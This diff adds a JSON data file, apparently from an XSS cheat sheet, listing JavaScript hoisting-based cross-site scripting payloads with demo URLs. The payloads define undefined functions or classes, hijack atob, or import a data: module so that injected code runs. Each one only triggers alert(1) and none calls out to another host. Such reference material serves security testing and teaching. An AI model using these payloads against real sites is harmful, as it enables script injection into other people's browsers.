@@ -1,0 +1,50 @@
+[
+  {
+    "description": "XSS Hoisting via undefined variable",
+    "code": "<script>eval(myUndefVar);var inject=\"INJECTION_STARTS_HERE\";var myUndefVar;alert(1);\/\/\";<\/script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": "https:\/\/portswigger-labs.net\/xss\/xss.php?x=%3Cscript%3E%0a\/*PREVIOUS%20STATIC%20JS*\/%0aeval(myUndefVar);%0a%0a\/*INJECTION%20PART%20WITH%20HOISTING*\/%0avar%20inject=%22INJECTION_STARTS_HERE%22;var%20myUndefVar;alert(1);\/\/%22;%0a%3C\/script%3E"
+  },
+  {
+    "description": "XSS Hoisting via undefined function",
+    "code": "<script>myUndefFunction(13,37);var inject=\"INJECTION_STARTS_HERE\";function myUndefFunction(){};alert(1);\/\/\";<\/script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": "https:\/\/portswigger-labs.net\/xss\/xss.php?x=%3Cscript%3E%0a\/*PREVIOUS%20STATIC%20JS*\/%0amyUndefFunction(13,37);%0a%0a\/*INJECTION%20PART%20WITH%20HOISTING*\/%0avar%20inject=%22INJECTION_STARTS_HERE%22;function%20myUndefFunction(){};alert(1);\/\/%22;%0a%3C\/script%3E"
+  },
+  {
+    "description": "XSS Hoisting via undefined class",
+    "code": "<script>var myUndefObject = new myUndefClass();var inject=\"INJECTION_STARTS_HERE\";function myUndefClass(){};alert(1);\/\/\";<\/script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": "https:\/\/portswigger-labs.net\/xss\/xss.php?x=%3Cscript%3E%0a\/*PREVIOUS%20STATIC%20JS*\/%0avar%20myUndefObject%20=%20new%20myUndefClass();%0a%0a\/*INJECTION%20PART%20WITH%20HOISTING*\/%0avar%20inject=%22INJECTION_STARTS_HERE%22;function%20myUndefClass(){};alert(1);\/\/%22;%0a%3C\/script%3E"
+  },
+  {
+    "description": "XSS Hoisting via undefined JQuery $(document).ready()",
+    "code": "<script>$(document).ready(function(){var inject=\"INJECTION_STARTS_HERE\";});function $(){return{ready:()=>0}};alert(1);(function(){\"\";});<\/script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": "https:\/\/portswigger-labs.net\/xss\/xss.php?x=%3Cscript%3E%0a\/*PREVIOUS%20STATIC%20JS*\/%0a$(document).ready(function(){%0a%0a\/*INJECTION%20PART%20WITH%20HOISTING*\/%0avar%20inject=%22INJECTION_STARTS_HERE%22;});function%20$(){return{ready:()=%3E0}};alert(1);({\/\/%22;%0a%0a});%0a%3C\/script%3E"
+  },
+  {
+    "description": "XSS Hoisting via parameter of an undefined accessor (object syntax)",
+    "code": "<script>undef01.undef02(\"INJECTION\"+alert(1));function undef01(){}\/\/\");<\/script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": "https:\/\/portswigger-labs.net\/xss\/xss.php?x=%3Cscript%3Eundef01.undef02(%22INJECTION%22%2balert(1));function%20undef01(){}\/\/%22);%3C\/script%3E"
+  },
+  {
+    "description": "XSS Hoisting via parameter of an undefined accessor (array syntax)",
+    "code": "<script>undef01['undef02','INJECTION'+alert(1)];function undef01(){};\/\/'];<\/script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": "https:\/\/portswigger-labs.net\/xss\/xss.php?x=%3Cscript%3Eundef01[%27undef02%27,%27INJECTION%27%2balert(1)];function%20undef01(){};\/\/%27];%3C\/script%3E"
+  },
+  {
+    "description": "XSS Hoisting via undefined accessor (module type + import)",
+    "code": "<script type=\"module\">undef01.undef02.undef03.undef04.undef05();var inject = \"INJECTION\";import \"data:text\/jscript,alert(1)\"\/\/\";<\/script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": "https:\/\/portswigger-labs.net\/xss\/xss.php?x=%3Cscript%20type=%22module%22%3E%0a\/*PREVIOUS%20STATIC%20JS*\/%0aundef01.undef02.undef03.undef04.undef05();%0a%0a\/*INJECTION%20PART%20WITH%20HOISTING*\/%0avar%20inject%20=%20%22INJECTION%22;import%20%22data:text\/jscript,alert(1)%22\/\/%22;%3C\/script%3E"
+  },
+  {
+    "description": "XSS Hoisting via native function hijacking",
+    "code": "<script>var x=atob(\"dXNlbGVzcyBjYWxsIG9mIG5hdGl2ZSBmdW5jdGlvbiAh\");undef01.undef02();var inject = \"INJECTION\";function atob(){alert(1);}\/\/\";<\/script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": "https:\/\/portswigger-labs.net\/xss\/xss.php?x=%3Cscript%3E%0a\/*PREVIOUS%20STATIC%20JS*\/%0avar%20x=atob(%22dXNlbGVzcyBjYWxsIG9mIG5hdGl2ZSBmdW5jdGlvbiAh%22);%0aundef01.undef02();%0a%0a\/*INJECTION%20PART%20WITH%20HOISTING*\/%0avar%20inject%20=%20%22INJECTION%22;function%20atob(){alert(1);}\/\/%22;%3C\/script%3E"
+  }
+]
